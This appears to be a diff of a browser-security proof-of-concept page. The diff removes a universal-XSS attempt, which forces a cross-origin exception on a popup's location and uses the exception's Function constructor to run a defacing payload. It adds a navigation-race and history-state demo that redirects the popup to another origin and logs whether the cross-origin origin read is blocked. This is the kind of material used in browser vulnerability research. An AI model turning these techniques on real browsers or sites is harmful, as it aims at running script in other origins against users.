@@ -1,93 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Navigation Race + Popup PoC</title>
+</head>
 <body>
+
+<h2>Race + Origin Demo</h2>
+<div id="log"></div>
+
 <script>
 // ==============================
-// CONFIG
+// LOGGER
 // ==============================
-var TARGET_ORIGIN = "https://example.com"; // Origin berbeda
-var DELAY = 1000;
+function logEvent(name, data = {}) {
+    const el = document.createElement("div");
+    el.textContent = `[${Date.now()}] ${name} ` + JSON.stringify(data);
+    document.getElementById("log").appendChild(el);
+    console.log(name, data);
+}
 
 // ==============================
-// UTILS
+// FAST TRIGGER ENGINE
 // ==============================
-function log(msg) { console.log("[POC] " + msg); }
-function safeExec(fn) { try { fn(); } catch(e){ log(e); } }
+const triggers = [];
+
+function registerTrigger(condition, action) {
+    triggers.push({ condition, action, fired: false });
+}
+
+// lebih agresif: pakai rAF loop instead of setInterval
+function runTriggers() {
+    triggers.forEach(t => {
+        if (!t.fired && t.condition()) {
+            t.fired = true;
+            logEvent("trigger_fired");
+            t.action();
+        }
+    });
+    requestAnimationFrame(runTriggers);
+}
+runTriggers();
 
 // ==============================
-// STEP 1: OPEN CROSS-ORIGIN POPUP
+// STEP 1: POPUP OPEN
 // ==============================
+let popup = null;
+
 function openPopup() {
-    log("Opening cross-origin popup...");
-    var popup = window.open(TARGET_ORIGIN, "_blank", "width=400,height=300");
+    popup = window.open("about:blank", "_blank", "width=400,height=300");
     if (!popup) {
         alert("Popup blocked!");
-        return null;
+        return;
     }
-    return popup;
+
+    popup.document.write("<h3>Loading...</h3>");
+    logEvent("popup_opened");
 }
 
 // ==============================
-// STEP 2: TRIGGER EXCEPTION TO GET FUNCTION
+// STEP 2: STATE CONFUSION
 // ==============================
-function triggerUXSS(victim) {
-    log("Triggering exception for UXSS...");
-
-    try {
-        // Force exception using cross-origin call
-        location.assign.call(victim.location);
-    } catch (e) {
-        log("Exception captured ✔");
-        return e;
-    }
-
-    log("No exception ❌");
-    return null;
+function setupState() {
+    history.pushState({}, '', '/trusted');
+    logEvent("pushstate_done", { path: location.pathname });
 }
 
 // ==============================
-// STEP 3: EXECUTE PAYLOAD IN POPUP
+// STEP 3: TRIGGER NAVIGATION
 // ==============================
-function executePayload(exceptionObject) {
-    log("Executing payload in popup...");
+registerTrigger(
+    () => popup && location.pathname === "/trusted",
+    () => {
+        logEvent("navigation_triggered");
 
-    safeExec(function() {
-        var func = exceptionObject.constructor.constructor;
+        // arahkan popup ke origin lain
+        popup.location.href = "https://example.com";
 
-        // Payload: runs inside popup origin
-        func(`
-            document.body.style.backgroundColor = '#111';
-            document.body.style.color = '#0f0';
-            document.body.innerHTML = "<h1>UXSS - Cross-Origin Popup!</h1>";
-            document.title = "Popup Owned!";
-            alert("Popup Origin: " + location.origin);
-            console.log("Payload executed in:", location.href);
-        `)();
+        // coba baca origin (akan gagal → ini point demo)
+        setTimeout(() => {
+            try {
+                let o = popup.location.origin;
+                logEvent("origin_read", { origin: o });
+            } catch (e) {
+                logEvent("cross_origin_blocked", { message: e.message });
+            }
+        }, 100);
+    }
+);
+
+// ==============================
+// STEP 4: RACE SETUP
+// ==============================
+window.addEventListener("pageshow", () => {
+    logEvent("pageshow");
+
+    openPopup();
+
+    requestAnimationFrame(() => {
+        requestAnimationFrame(() => {
+            setTimeout(() => {
+                logEvent("race_window");
+                setupState();
+            }, 10); // lebih agresif
+        });
     });
-}
-
-// ==============================
-// MAIN FLOW
-// ==============================
-function runPoC() {
-    log("Starting cross-origin popup PoC...");
-
-    var popup = openPopup();
-    if (!popup) return;
-
-    setTimeout(function() {
-        var ex = triggerUXSS(popup);
-        if (!ex) return;
-
-        executePayload(ex);
-
-    }, DELAY);
-}
+});
 
 // ==============================
 // START
 // ==============================
-runPoC();
+logEvent("init");
+
 </script>
 
-<h2>Check the popup!</h2>
-<p>This PoC opens a popup from a different origin and runs a payload in it.</p>
 </body>
+</html>
